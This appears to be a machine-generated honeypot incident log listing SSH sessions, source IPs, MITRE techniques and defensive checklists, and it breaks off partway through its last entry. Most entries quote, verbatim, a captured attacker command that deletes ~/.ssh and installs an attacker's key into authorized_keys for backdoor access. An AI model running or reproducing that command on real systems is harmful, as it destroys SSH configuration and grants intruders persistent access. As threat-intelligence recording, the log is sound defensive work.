### 🔴 HIGH · IR-5b1b9c3bd95f

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-04-09 18:02 |
| **Last Seen** | 2026-04-09 18:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 18:02:07` | `cowrie.session.connect` |
| `2026-04-09 18:02:07` | `cowrie.client.version` |
| `2026-04-09 18:02:07` | `cowrie.client.kex` |
| `2026-04-09 18:02:07` | `cowrie.login.success` |
| `2026-04-09 18:02:08` | `cowrie.session.params` |
| `2026-04-09 18:02:08` | `cowrie.command.input` |
| `2026-04-09 18:02:08` | `cowrie.command.failed` |
| `2026-04-09 18:02:08` | `cowrie.log.closed` |
| `2026-04-09 18:02:08` | `cowrie.session.params` |
| `2026-04-09 18:02:08` | `cowrie.command.input` |
| `2026-04-09 18:02:08` | `cowrie.session.file_download` |
| `2026-04-09 18:02:08` | `cowrie.log.closed` |
| `2026-04-09 18:02:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e60df9bccff

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-04-09 18:02 |
| **Last Seen** | 2026-04-09 18:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 18:02:10` | `cowrie.session.connect` |
| `2026-04-09 18:02:10` | `cowrie.client.version` |
| `2026-04-09 18:02:11` | `cowrie.client.kex` |
| `2026-04-09 18:02:11` | `cowrie.login.success` |
| `2026-04-09 18:02:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c72fac7cc73

| Field | Detail |
|---|---|
| **Source IP** | `189.50.142[.]78` |
| **First Seen** | 2026-04-09 18:03 |
| **Last Seen** | 2026-04-09 18:03 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 18:03:05` | `cowrie.session.connect` |
| `2026-04-09 18:03:05` | `cowrie.client.version` |
| `2026-04-09 18:03:05` | `cowrie.client.kex` |
| `2026-04-09 18:03:07` | `cowrie.login.success` |
| `2026-04-09 18:03:08` | `cowrie.session.params` |
| `2026-04-09 18:03:08` | `cowrie.command.input` |
| `2026-04-09 18:03:08` | `cowrie.command.failed` |
| `2026-04-09 18:03:08` | `cowrie.log.closed` |
| `2026-04-09 18:03:09` | `cowrie.session.params` |
| `2026-04-09 18:03:09` | `cowrie.command.input` |
| `2026-04-09 18:03:09` | `cowrie.session.file_download` |
| `2026-04-09 18:03:09` | `cowrie.log.closed` |
| `2026-04-09 18:03:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.50.142[.]78` to AbuseIPDB if not already reported
- [ ] Block `189.50.142[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7922625753cd

| Field | Detail |
|---|---|
| **Source IP** | `189.50.142[.]78` |
| **First Seen** | 2026-04-09 18:03 |
| **Last Seen** | 2026-04-09 18:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 18:03:14` | `cowrie.session.connect` |
| `2026-04-09 18:03:14` | `cowrie.client.version` |
| `2026-04-09 18:03:14` | `cowrie.client.kex` |
| `2026-04-09 18:03:16` | `cowrie.login.success` |
| `2026-04-09 18:03:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.50.142[.]78` to AbuseIPDB if not already reported
- [ ] Block `189.50.142[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e83d8ca25026

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-04-09 18:03 |
| **Last Seen** | 2026-04-09 18:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 18:03:30` | `cowrie.session.connect` |
| `2026-04-09 18:03:30` | `cowrie.client.version` |
| `2026-04-09 18:03:31` | `cowrie.client.kex` |
| `2026-04-09 18:03:31` | `cowrie.login.success` |
| `2026-04-09 18:03:31` | `cowrie.session.params` |
| `2026-04-09 18:03:31` | `cowrie.command.input` |
| `2026-04-09 18:03:31` | `cowrie.command.failed` |
| `2026-04-09 18:03:32` | `cowrie.log.closed` |
| `2026-04-09 18:03:32` | `cowrie.session.params` |
| `2026-04-09 18:03:32` | `cowrie.command.input` |
| `2026-04-09 18:03:32` | `cowrie.session.file_download` |
| `2026-04-09 18:03:32` | `cowrie.log.closed` |
| `2026-04-09 18:03:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a1ee87eac62

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-04-09 18:03 |
| **Last Seen** | 2026-04-09 18:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 18:03:34` | `cowrie.session.connect` |
| `2026-04-09 18:03:34` | `cowrie.client.version` |
| `2026-04-09 18:03:34` | `cowrie.client.kex` |
| `2026-04-09 18:03:35` | `cowrie.login.success` |
| `2026-04-09 18:03:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-116326c89a9e

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-04-09 18:04 |
| **Last Seen** | 2026-04-09 18:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 18:04:51` | `cowrie.session.connect` |
| `2026-04-09 18:04:51` | `cowrie.client.version` |
| `2026-04-09 18:04:51` | `cowrie.client.kex` |
| `2026-04-09 18:04:52` | `cowrie.login.success` |
| `2026-04-09 18:04:52` | `cowrie.session.params` |
| `2026-04-09 18:04:52` | `cowrie.command.input` |
| `2026-04-09 18:04:52` | `cowrie.command.failed` |
| `2026-04-09 18:04:52` | `cowrie.log.closed` |
| `2026-04-09 18:04:53` | `cowrie.session.params` |
| `2026-04-09 18:04:53` | `cowrie.command.input` |
| `2026-04-09 18:04:53` | `cowrie.session.file_download` |
| `2026-04-09 18:04:53` | `cowrie.log.closed` |
| `2026-04-09 18:04:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e59dae8e396

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-04-09 18:04 |
| **Last Seen** | 2026-04-09 18:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 18:04:55` | `cowrie.session.connect` |
| `2026-04-09 18:04:55` | `cowrie.client.version` |
| `2026-04-09 18:04:55` | `cowrie.client.kex` |
| `2026-04-09 18:04:56` | `cowrie.login.success` |
| `2026-04-09 18:04:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bed78aec785e

| Field | Detail |
|---|---|
| **Source IP** | `68.183.89[.]21` |
| **First Seen** | 2026-04-09 18:09 |
| **Last Seen** | 2026-04-09 18:10 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo -n login_success` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 18:09:49` | `cowrie.session.connect` |
| `2026-04-09 18:09:50` | `cowrie.client.version` |
| `2026-04-09 18:09:50` | `cowrie.client.kex` |
| `2026-04-09 18:09:59` | `cowrie.login.success` |
| `2026-04-09 18:10:00` | `cowrie.session.params` |
| `2026-04-09 18:10:00` | `cowrie.command.input` |
| `2026-04-09 18:10:01` | `cowrie.log.closed` |
| `2026-04-09 18:10:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.89[.]21` to AbuseIPDB if not already reported
- [ ] Block `68.183.89[.]21` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bd937a83972

| Field | Detail |
|---|---|
| **Source IP** | `49.231.192[.]36` |
| **First Seen** | 2026-04-09 18:10 |
| **Last Seen** | 2026-04-09 18:10 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 18:10:04` | `cowrie.session.connect` |
| `2026-04-09 18:10:05` | `cowrie.client.version` |
| `2026-04-09 18:10:06` | `cowrie.client.kex` |
| `2026-04-09 18:10:06` | `cowrie.login.success` |
| `2026-04-09 18:10:06` | `cowrie.session.params` |
| `2026-04-09 18:10:06` | `cowrie.command.input` |
| `2026-04-09 18:10:06` | `cowrie.command.failed` |
| `2026-04-09 18:10:07` | `cowrie.log.closed` |
| `2026-04-09 18:10:08` | `cowrie.session.params` |
| `2026-04-09 18:10:08` | `cowrie.command.input` |
| `2026-04-09 18:10:08` | `cowrie.session.file_download` |
| `2026-04-09 18:10:08` | `cowrie.log.closed` |
| `2026-04-09 18:10:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.231.192[.]36` to AbuseIPDB if not already reported
- [ ] Block `49.231.192[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a012adccb3e

| Field | Detail |
|---|---|
| **Source IP** | `49.231.192[.]36` |
| **First Seen** | 2026-04-09 18:10 |
| **Last Seen** | 2026-04-09 18:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 18:10:11` | `cowrie.session.connect` |
| `2026-04-09 18:10:11` | `cowrie.client.version` |
| `2026-04-09 18:10:12` | `cowrie.client.kex` |
| `2026-04-09 18:10:13` | `cowrie.login.success` |
| `2026-04-09 18:10:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.231.192[.]36` to AbuseIPDB if not already reported
- [ ] Block `49.231.192[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc4fd82f4374

| Field | Detail |
|---|---|
| **Source IP** | `189.50.142[.]78` |
| **First Seen** | 2026-04-09 18:13 |
| **Last Seen** | 2026-04-09 18:13 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 18:13:47` | `cowrie.session.connect` |
| `2026-04-09 18:13:47` | `cowrie.client.version` |
| `2026-04-09 18:13:47` | `cowrie.client.kex` |
| `2026-04-09 18:13:49` | `cowrie.login.success` |
| `2026-04-09 18:13:50` | `cowrie.session.params` |
| `2026-04-09 18:13:50` | `cowrie.command.input` |
| `2026-04-09 18:13:50` | `cowrie.command.failed` |
| `2026-04-09 18:13:50` | `cowrie.log.closed` |
| `2026-04-09 18:13:51` | `cowrie.session.params` |
| `2026-04-09 18:13:51` | `cowrie.command.input` |
| `2026-04-09 18:13:51` | `cowrie.session.file_download` |
| `2026-04-09 18:13:51` | `cowrie.log.closed` |
| `2026-04-09 18:13:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.50.142[.]78` to AbuseIPDB if not already reported
- [ ] Block `189.50.142[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d42845ab19cb

| Field | Detail |
|---|---|
| **Source IP** | `189.50.142[.]78` |
| **First Seen** | 2026-04-09 18:13 |
| **Last Seen** | 2026-04-09 18:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 18:13:56` | `cowrie.session.connect` |
| `2026-04-09 18:13:56` | `cowrie.client.version` |
| `2026-04-09 18:13:56` | `cowrie.client.kex` |
| `2026-04-09 18:13:58` | `cowrie.login.success` |
| `2026-04-09 18:13:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.50.142[.]78` to AbuseIPDB if not already reported
- [ ] Block `189.50.142[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40b93eb9dd39

| Field | Detail |
|---|---|
| **Source IP** | `49.231.192[.]36` |
| **First Seen** | 2026-04-09 18:16 |
| **Last Seen** | 2026-04-09 18:16 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 18:16:33` | `cowrie.session.connect` |
| `2026-04-09 18:16:33` | `cowrie.client.version` |
| `2026-04-09 18:16:33` | `cowrie.client.kex` |
| `2026-04-09 18:16:34` | `cowrie.login.success` |
| `2026-04-09 18:16:34` | `cowrie.session.params` |
| `2026-04-09 18:16:34` | `cowrie.command.input` |
| `2026-04-09 18:16:34` | `cowrie.command.failed` |
| `2026-04-09 18:16:35` | `cowrie.log.closed` |
| `2026-04-09 18:16:35` | `cowrie.session.params` |
| `2026-04-09 18:16:35` | `cowrie.command.input` |
| `2026-04-09 18:16:36` | `cowrie.session.file_download` |
| `2026-04-09 18:16:36` | `cowrie.log.closed` |
| `2026-04-09 18:16:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.231.192[.]36` to AbuseIPDB if not already reported
- [ ] Block `49.231.192[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-824af90c0f32

| Field | Detail |
|---|---|
| **Source IP** | `49.231.192[.]36` |
| **First Seen** | 2026-04-09 18:16 |
| **Last Seen** | 2026-04-09 18:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 18:16:39` | `cowrie.session.connect` |
| `2026-04-09 18:16:39` | `cowrie.client.version` |
| `2026-04-09 18:16:39` | `cowrie.client.kex` |
| `2026-04-09 18:16:40` | `cowrie.login.success` |
| `2026-04-09 18:16:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.231.192[.]36` to AbuseIPDB if not already reported
- [ ] Block `49.231.192[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de77fbfec0c4

| Field | Detail |
|---|---|
| **Source IP** | `49.231.192[.]36` |
| **First Seen** | 2026-04-09 18:19 |
| **Last Seen** | 2026-04-09 18:19 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 18:19:44` | `cowrie.session.connect` |
| `2026-04-09 18:19:44` | `cowrie.client.version` |
| `2026-04-09 18:19:44` | `cowrie.client.kex` |
| `2026-04-09 18:19:45` | `cowrie.login.success` |
| `2026-04-09 18:19:45` | `cowrie.session.params` |
| `2026-04-09 18:19:45` | `cowrie.command.input` |
| `2026-04-09 18:19:45` | `cowrie.command.failed` |
| `2026-04-09 18:19:45` | `cowrie.log.closed` |
| `2026-04-09 18:19:46` | `cowrie.session.params` |
| `2026-04-09 18:19:46` | `cowrie.command.input` |
| `2026-04-09 18:19:46` | `cowrie.session.file_download` |
| `2026-04-09 18:19:46` | `cowrie.log.closed` |
| `2026-04-09 18:19:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.231.192[.]36` to AbuseIPDB if not already reported
- [ ] Block `49.231.192[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43c00289818a

| Field | Detail |
|---|---|
| **Source IP** | `49.231.192[.]36` |
| **First Seen** | 2026-04-09 18:19 |
| **Last Seen** | 2026-04-09 18:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 18:19:48` | `cowrie.session.connect` |
| `2026-04-09 18:19:48` | `cowrie.client.version` |
| `2026-04-09 18:19:49` | `cowrie.client.kex` |
| `2026-04-09 18:19:49` | `cowrie.login.success` |
| `2026-04-09 18:19:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.231.192[.]36` to AbuseIPDB if not already reported
- [ ] Block `49.231.192[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc6162d1c987

| Field | Detail |
|---|---|
| **Source IP** | `189.50.142[.]78` |
| **First Seen** | 2026-04-09 18:35 |
| **Last Seen** | 2026-04-09 18:35 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
